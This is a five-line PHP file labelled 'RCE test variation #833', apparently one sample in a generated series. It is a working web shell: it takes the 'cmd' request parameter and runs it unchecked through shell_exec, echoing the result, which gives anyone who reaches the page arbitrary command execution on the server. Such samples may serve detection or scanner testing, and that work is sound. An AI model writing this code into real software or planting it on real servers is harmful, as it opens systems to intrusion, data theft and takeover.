<?php
// RCE test variation #833
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>